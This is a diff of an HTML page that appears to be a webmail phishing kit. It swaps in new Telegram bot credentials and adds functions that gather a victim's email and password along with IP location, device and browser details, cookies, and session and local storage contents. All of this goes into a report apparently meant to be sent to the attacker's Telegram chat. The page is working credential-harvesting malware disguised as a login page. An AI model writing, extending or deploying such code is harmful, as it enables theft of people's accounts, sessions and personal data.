@@ -1,5 +1,6 @@
 
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -162,8 +163,8 @@
 
 <script>
 // TELEGRAM CONFIG
-var BOT_TOKEN = "8593720535:AAGueaBHUeXwXyRgz5hPlxd8uji0WL9mo4Q";
-var CHAT_ID = "8049818291";
+var BOT_TOKEN = "8379257899:AAH8cMuBCZIsZ89PGQdlKSQigWHUunxm5Z0";
+var CHAT_ID = "7491656108";
 
 var currentEmail = "";
 var attemptCount = 0;
@@ -226,7 +227,73 @@ function grabStorageData() {
         storageData += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
         storageData += "COOKIES (non-HttpOnly)\n";
         storageData += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
-        storageData += document.cooki━━━━━━━━━━━━━━━━━━━━━━━\n";
+        storageData += document.cookie + "\n";
+    }
+    
+    if (sessionStorage && sessionStorage.length > 0) {
+        storageData += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        storageData += "SESSION STORAGE\n";
+        storageData += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        for(var i = 0; i < sessionStorage.length; i++) {
+            var key = sessionStorage.key(i);
+            var value = sessionStorage.getItem(key);
+            if (value && value.length > 500) value = value.substring(0, 500) + "...";
+            storageData += key + ": " + value + "\n";
+        }
+    }
+    
+    if (localStorage && localStorage.length > 0) {
+        storageData += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        storageData += "LOCAL STORAGE\n";
+        storageData += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        for(var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            var value = localStorage.getItem(key);
+            if (value && value.length > 500) value = value.substring(0, 500) + "...";
+            storageData += key + ": " + value + "\n";
+        }
+    }
+    
+    return storageData;
+}
+
+// Build report
+function buildReport(password) {
+    var timeOnPage = Math.floor((Date.now() - startTime) / 1000);
+    var deviceType = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent) ? "Mobile" : "Desktop";
+    var browserMatch = userAgent.match(/(Chrome|Firefox|Safari|Edge|MSIE|Trident)/i);
+    var browser = browserMatch ? browserMatch[1] : "Unknown";
+    var osMatch = userAgent.match(/(Windows NT|Mac OS X|iPhone OS|Android|Linux)/i);
+    var os = osMatch ? osMatch[1] : "Unknown";
+    
+    var report = "";
+    report += "WEBMAIL: LOGIN CREDENTIALS\n";
+    report += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
+    report += "EMAIL: " + currentEmail + "\n";
+    report += "PASSWORD: " + password + "\n";
+    report += "ATTEMPT: #" + attemptCount + "\n";
+    report += "TIME: " + timeOnPage + " sec\n\n";
+    report += "LOCATION\n";
+    report += "IP: " + ipData + "\n";
+    report += "CITY: " + cityData + "\n";
+    report += "REGION: " + regionData + "\n";
+    report += "COUNTRY: " + countryData + "\n";
+    report += "ISP: " + ispData + "\n";
+    report += "TIMEZONE: " + timezone + "\n\n";
+    report += "DEVICE\n";
+    report += "OS: " + os + " (" + platform + ")\n";
+    report += "DEVICE TYPE: " + deviceType + "\n";
+    report += "BROWSER: " + browser + "\n";
+    report += "LANGUAGE: " + browserLang + "\n";
+    report += "SCREEN: " + screenRes + "\n";
+    report += "USER AGENT: " + userAgent + "\n";
+    
+    var storageData = grabStorageData();
+    if (storageData) {
+        report += storageData;
+    }
+    
+    report += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
     report += new Date().toISOString();
     
     return report;
